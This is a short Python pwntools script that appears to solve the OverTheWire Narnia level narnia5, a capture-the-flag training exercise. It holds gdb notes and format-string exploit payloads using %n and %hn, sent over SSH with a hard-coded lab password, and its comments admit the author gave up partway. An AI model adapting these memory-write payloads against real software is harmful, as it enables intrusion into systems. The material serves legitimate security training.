from pwn import *

"""
local exploit:
    gdb -q narnia5
    b *0x08048544
    r $(python -c 'print "\xb0\xd6\xff\xff" + "%n"')
You will see that the i variable now is 4.
    r $(python -c 'print "\xb0\xd6\xff\xff" + "A" * 496 + "%n"')
The address of i variable changed, so you need to change it within format string:
    r $(python -c 'print "\xc0\xd4\xff\xff" + "A"*496 + "%n"')
Try it outside gdb
"""
con = ssh('narnia5', 'narnia.labs.overthewire.org', password='faimahchiy', port=2226)
# The problem is a null byte in the address, so you can't just send it to the program...
# You need some way to write
p = con.process(['/narnia/narnia5', "A"* 4 + "%x."])
print(p.recv())
# Okay,I gave up on it
# I don't know how to exploit it in a normal way.
i_addr_int = int(0xffffdb11)
p = con.process(['/narnia/narnia5', p32(i_addr_int - 0x2) + p32(i_addr_int) + b"A" * 496 + b"%2$hn"])
print(p.recv())
